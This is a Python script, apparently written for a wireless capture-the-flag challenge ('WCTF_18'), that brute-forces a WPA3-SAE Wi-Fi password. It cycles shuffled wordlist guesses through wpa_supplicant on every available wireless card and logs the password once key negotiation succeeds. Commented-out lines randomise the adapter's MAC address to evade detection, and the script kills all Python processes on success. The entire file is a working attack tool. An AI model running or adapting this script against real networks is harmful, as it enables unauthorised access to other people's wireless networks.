
import logging
import time
import os
import sys
import signal
from queue import Queue
from threading import Thread
from subprocess import Popen, PIPE
from random import shuffle
import time

# CHANGE ME
TARGET_SSID = 'WCTF_18'
TARGET_MAC = '00:70:6B:6D:CA:40'
TARGET_FREQ = '5805'

password_queue = Queue()
start_size = 0

wpa3_conf = '''
#ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev

network={{
    ssid="{ssid}"
    bssid={bssid}
    freq_list={freq}
    psk="{pwd}"
    key_mgmt=SAE
    pairwise=CCMP
    group=CCMP
    ieee80211w=2
}}
'''

# Setup Logging
logger = logging.getLogger()
logger.setLevel(logging.DEBUG)
formatter = logging.Formatter(fmt="%(asctime)s.%(msecs)03d: %(message)s", datefmt="%H:%M:%S")

fh = logging.FileHandler('wpa_brute.log', mode='w')
fh.setLevel(logging.DEBUG)
fh.setFormatter(formatter)
ch = logging.StreamHandler()
ch.setLevel(logging.INFO)
ch.setFormatter(formatter)

logger.addHandler(fh)
logger.addHandler(ch)


def get_wireless_cards():
    """Enumerate the list of Wireless Interfaces"""
    interfaces = set()
    iface = ''

    pid = Popen('iwconfig', cwd=None, stdout=PIPE, stderr=PIPE)
    pid.wait()
    (stdout, stderr) = pid.communicate()

    # Python 3 compatibility
    if type(stdout) is bytes: out = stdout.decode('utf-8')
    if type(stderr) is bytes: err = stderr.decode('utf-8')

    for line in out.split('\n'):
        if len(line) == 0: continue

        if not line.startswith(' '):
            iface = line.split(' ')[0]
            if '\t' in iface:
                iface = iface.split('\t')[0].strip()

            iface = iface.strip()
            if len(iface) == 0:
                continue

            interfaces.add(iface)

    return list(interfaces)


def connect(nic, password_queue):
    config_name = f'{nic}_supp.conf'
    os.system(f'sudo ifconfig {nic} up')

    while True:
        pwd = password_queue.get()

        # Create the Supplicant File
        config = open(config_name, 'w')
        config.write(wpa3_conf.format(ssid=TARGET_SSID, bssid=TARGET_MAC, freq=TARGET_FREQ, pwd=pwd))
        config.close()

        # Roll the MAC of the Adapter
        #os.system(f'sudo ifconfig {nic} down')
        #os.system(f'sudo macchanger -r {nic} > /dev/null')
        #os.system(f'sudo ifconfig {nic} up')

        popen = Popen(['wpa_supplicant', '-i', nic, '-c', config_name], cwd=None, stdout=PIPE, stderr=PIPE)
        bad_auth_cnt = 0
        for line in popen.stdout:
            if b'SME: Trying to authenticate' in line:
                bad_auth_cnt += 1
                if bad_auth_cnt > 3:
                    logger.debug(f'Invalid Password Attempt: {pwd}')
                    break
            elif b'WPA: Key negotiation completed' in line:
                success = open('password.txt', 'w')
                success.write(pwd)
                success.close()
                print_status()
                print('-------------------------------')
                print(f'PASSWORD FOUND: {pwd}')
                print('-------------------------------')
                os.system('pkill python')

        # Cleanup and Move to Next Password
        popen.stdout.close()
        popen.stderr.close()
        popen.kill()

        password_queue.task_done()


def print_status():
    print()
    print('-------------------------------')
    print('Start Time:   {}'.format(time.strftime("%d %b %Y %H:%M:%S", time.localtime(start_time))))
    print('Time Elapsed: {} hours'.format((time.time() - start_time) / 3600))
    print('Queue Status: {} Passwords Tested ({}% Remaing)'.format((start_size - password_queue.qsize()), (password_queue.qsize() / start_size * 100)))
    print('Attack Speed: {} pw/s'.format((start_size - password_queue.qsize()) / (time.time() - start_time)))
    print('-------------------------------')
    print()
    print('Press any key to update report.')


# Utilize all available NICs
nics = get_wireless_cards()
# Remove internal NIC. Driver tends to have issues after a while.
# nics.remove('wlan0')
nic_cnt = len(nics)
logger.info('{} Nics Available for Bruteforce Operations'.format(nic_cnt))

# Setup Worker Threads - Use the first one to debug with single NIC
for nic in nics:
    logger.info(f'Registering worker for {nic}')
    worker = Thread(target=connect, args=(nic, password_queue,))
    worker.setDaemon(True)
    worker.start()

# Add the password list to queue in randomized order
logger.info('Reading and shuffling the password list.')
words = open('cyberpunk.words').readlines()
shuffle(words)
start_time = time.time()
for word in words:
    password_queue.put(word.strip())
start_size = password_queue.qsize()
logger.info('Passwords added to queue: {}'.format(start_size))

print_status()
while True:
    key = input()

    if key != None:
        print_status()





